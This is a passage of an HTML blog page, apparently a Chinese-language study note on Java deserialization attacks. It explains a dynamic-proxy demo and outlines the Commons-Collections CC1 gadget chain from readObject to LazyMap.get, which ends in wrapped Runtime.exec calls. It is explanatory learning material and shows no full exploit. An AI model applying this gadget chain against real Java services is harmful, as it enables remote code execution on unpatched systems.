+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Perosn</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Perosn</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">handler</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getInterfaces</span><span class="p">(),</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">p</span><span class="p">.</span><span class="na">name</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// 结果</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SayInvocationHandler</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SAY</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SayInvocationHandler</span><span class="w"> </span><span class="n">DONE</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>整个demo所体现的最重要的一条：<strong>当调用接口的任何方法的时候，都会去调用handler的invoke方法。</strong></p>
+<p>所以结合源代码：</p>
+<ol>
+<li>动态代理
+<ul>
+<li>lazyMap是一个包含执行代码链条的map</li>
+<li>包装成代理实例mapProxy，</li>
+</ul>
+</li>
+<li>调用触发其他调用</li>
+</ol>
+<p>聚焦于<code>Proxy.newProxyInstance</code>方法，三个参数分别为</p>
+<ul>
+<li>handler的getclass.getclassloader</li>
+<li>接口继承类的getclass.getinterfaces</li>
+<li>handler</li>
+</ul>
+<blockquote>
+<p>所以这里的理解：</p>
+</blockquote>
+<p>Map作为接口，
+获得的关于(ANN_INV_HANDLER_CLASS的InvocationHandler是handler</p>
+<p>当Map的任何方法被调用的时候，包装了lazymap的InvocationHandler都会去调用自己的invoke方法</p>
+<hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Gadget chain:
+</span></span><span class="line"><span class="cl">        ObjectInputStream.readObject()
+</span></span><span class="line"><span class="cl">            AnnotationInvocationHandler.readObject()
+</span></span><span class="line"><span class="cl">                Map(Proxy).entrySet()
+</span></span><span class="line"><span class="cl">                    AnnotationInvocationHandler.invoke()
+</span></span><span class="line"><span class="cl">                        LazyMap.get()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ANN_INV_HANDLER_CLASS也就是AnnotationInvocationHandler中的readObject方法会调用到Map的entrySet方法，</p>
+<p>于是就会触发AnnotationInvocationHandler的invoke方法，也就是transformer[]中存入的那些。</p>
+<hr>
+<hr>
+<h3 id="end">END
+</h3><p>对比下来，JDBCparty使用toString和RMI，被执行的代码并不复杂，复杂的是如何导入。并且是JDK高版本的内容，重点之一就是使用Unsafe获取访问<code>java.*</code>中private角色的权限。</p>
+<p>cc1是比较接近底层的evil code，把Runtime.getRuntime.exec层层封起来，再通过Proxy的有趣特性来触发其中包含的invoke方法进而执行evil code，针对的是低版本JDK比如JDK 8以下</p>
+<hr>
+<hr>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java/">JAVA</a>
+        
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "How about these days" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2022 - 
+        
+        2025 Real One x86
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
